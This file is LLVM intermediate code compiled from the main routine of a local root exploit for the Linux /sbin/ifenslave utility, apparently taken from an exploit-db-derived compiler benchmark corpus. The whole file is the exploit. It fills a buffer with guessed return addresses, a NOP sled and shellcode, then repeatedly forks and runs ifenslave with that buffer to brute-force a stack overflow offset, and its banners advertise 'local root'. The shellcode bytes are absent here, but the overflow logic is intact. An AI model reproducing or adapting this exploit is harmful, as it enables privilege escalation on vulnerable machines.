; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_22645.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_22645.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@RET = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [39 x i8] c"\0A[+] 0dd ifenslave local root xpl ;D\0A\0A\00", align 1
@.str.1 = private unnamed_addr constant [33 x i8] c"[~] Trying offset %d, addr 0x%x\0A\00", align 1
@NOP = common dso_local global i8 0, align 1
@shellcode = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [16 x i8] c"/sbin/ifenslave\00", align 1
@.str.3 = private unnamed_addr constant [26 x i8] c"[~] Received signal: #%i\0A\00", align 1
@.str.4 = private unnamed_addr constant [42 x i8] c"[+] Retaddr guessed: 0x%x\0A[~] Exiting...\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [1000 x i8], align 16
  %11 = alloca i64, align 8
  %12 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  store i32 20, i32* %9, align 4
  %13 = load i32, i32* @RET, align 4
  %14 = load i32, i32* %9, align 4
  %15 = add nsw i32 %13, %14
  %16 = sext i32 %15 to i64
  store i64 %16, i64* %11, align 8
  %17 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str, i64 0, i64 0))
  %18 = load i32, i32* %6, align 4
  %19 = load i64, i64* %11, align 8
  %20 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.1, i64 0, i64 0), i32 %18, i64 %19)
  br label %21

21:                                               ; preds = %97, %2
  %22 = load i32, i32* %6, align 4
  %23 = icmp sle i32 %22, 300
  br i1 %23, label %24, label %98

24:                                               ; preds = %21
  %25 = call i32 (...) @fork()
  store i32 %25, i32* %12, align 4
  %26 = icmp eq i32 %25, 0
  br i1 %26, label %27, label %75

27:                                               ; preds = %24
  store i32 0, i32* %8, align 4
  br label %28

28:                                               ; preds = %37, %27
  %29 = load i32, i32* %8, align 4
  %30 = icmp slt i32 %29, 200
  br i1 %30, label %31, label %40

31:                                               ; preds = %28
  %32 = load i64, i64* %11, align 8
  %33 = load i32, i32* %8, align 4
  %34 = sext i32 %33 to i64
  %35 = getelementptr inbounds [1000 x i8], [1000 x i8]* %10, i64 0, i64 %34
  %36 = bitcast i8* %35 to i64*
  store i64 %32, i64* %36, align 1
  br label %37

37:                                               ; preds = %31
  %38 = load i32, i32* %8, align 4
  %39 = add nsw i32 %38, 4
  store i32 %39, i32* %8, align 4
  br label %28

40:                                               ; preds = %28
  store i32 0, i32* %8, align 4
  br label %41

41:                                               ; preds = %50, %40
  %42 = load i32, i32* %8, align 4
  %43 = icmp slt i32 %42, 100
  br i1 %43, label %44, label %53

44:                                               ; preds = %41
  %45 = load i8, i8* @NOP, align 1
  %46 = load i32, i32* %8, align 4
  %47 = add nsw i32 %46, 200
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds [1000 x i8], [1000 x i8]* %10, i64 0, i64 %48
  store i8 %45, i8* %49, align 1
  br label %50

50:                                               ; preds = %44
  %51 = load i32, i32* %8, align 4
  %52 = add nsw i32 %51, 1
  store i32 %52, i32* %8, align 4
  br label %41

53:                                               ; preds = %41
  store i32 0, i32* %8, align 4
  br label %54

54:                                               ; preds = %69, %53
  %55 = load i32, i32* %8, align 4
  %56 = load i8*, i8** @shellcode, align 8
  %57 = call i32 @strlen(i8* %56)
  %58 = icmp slt i32 %55, %57
  br i1 %58, label %59, label %72

59:                                               ; preds = %54
  %60 = load i8*, i8** @shellcode, align 8
  %61 = load i32, i32* %8, align 4
  %62 = sext i32 %61 to i64
  %63 = getelementptr inbounds i8, i8* %60, i64 %62
  %64 = load i8, i8* %63, align 1
  %65 = load i32, i32* %8, align 4
  %66 = add nsw i32 %65, 300
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds [1000 x i8], [1000 x i8]* %10, i64 0, i64 %67
  store i8 %64, i8* %68, align 1
  br label %69

69:                                               ; preds = %59
  %70 = load i32, i32* %8, align 4
  %71 = add nsw i32 %70, 1
  store i32 %71, i32* %8, align 4
  br label %54

72:                                               ; preds = %54
  %73 = getelementptr inbounds [1000 x i8], [1000 x i8]* %10, i64 0, i64 0
  %74 = call i32 @execl(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.2, i64 0, i64 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.2, i64 0, i64 0), i8* %73, i32* null)
  br label %75

75:                                               ; preds = %72, %24
  %76 = call i32 @wait(i32* %7)
  %77 = load i32, i32* %7, align 4
  %78 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.3, i64 0, i64 0), i32 %77)
  %79 = load i32, i32* %7, align 4
  %80 = call i64 @WIFEXITED(i32 %79)
  %81 = icmp ne i64 %80, 0
  br i1 %81, label %82, label %86

82:                                               ; preds = %75
  %83 = load i64, i64* %11, align 8
  %84 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.4, i64 0, i64 0), i64 %83)
  %85 = call i32 @exit(i32 1) #3
  unreachable

86:                                               ; preds = %75
  %87 = load i32, i32* %9, align 4
  %88 = sext i32 %87 to i64
  %89 = load i64, i64* %11, align 8
  %90 = add nsw i64 %89, %88
  store i64 %90, i64* %11, align 8
  %91 = load i32, i32* %9, align 4
  %92 = load i32, i32* %6, align 4
  %93 = add nsw i32 %92, %91
  store i32 %93, i32* %6, align 4
  %94 = load i32, i32* %6, align 4
  %95 = load i64, i64* %11, align 8
  %96 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.1, i64 0, i64 0), i32 %94, i64 %95)
  br label %97

97:                                               ; preds = %86
  br label %21

98:                                               ; preds = %21
  %99 = load i32, i32* %3, align 4
  ret i32 %99
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @fork(...) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @execl(i8*, i8*, i8*, i32*) #1

declare dso_local i32 @wait(i32*) #1

declare dso_local i64 @WIFEXITED(i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
